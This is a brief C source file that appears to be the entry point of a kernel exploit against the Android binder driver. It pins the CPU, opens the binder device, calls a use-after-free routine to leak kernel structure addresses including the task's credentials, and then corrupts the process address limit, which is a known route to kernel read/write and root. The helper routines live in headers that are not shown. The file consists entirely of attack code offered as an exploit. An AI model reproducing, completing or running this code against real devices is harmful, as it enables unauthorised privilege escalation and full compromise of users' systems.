#include "../include/binder.h"
#include "../include/binder_uaf.h"
#include "../include/corrupt_address_limit.h"
#include "../include/cpu_affinity.h"

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
  struct task_struct *leak_task_struct = NULL; // Initialize to NULL
  void *leak_pid_address = NULL;
  void *leak_cred_address = NULL;
  void *leak_nsproxy_address = NULL;
  struct cred *m_cred = NULL;
  void *mapped_memory = NULL;

  pin_cpu(0);

  int binder_fd1 = open_binder(BINDER_DEVICE);

  binder_uaf_leak_task_struct(binder_fd1, &leak_task_struct, &leak_pid_address,
                              &leak_cred_address, &leak_nsproxy_address,
                              &mapped_memory);
  corrupt_address_limit(binder_fd1, &leak_task_struct, &mapped_memory);
  

  return 0;
}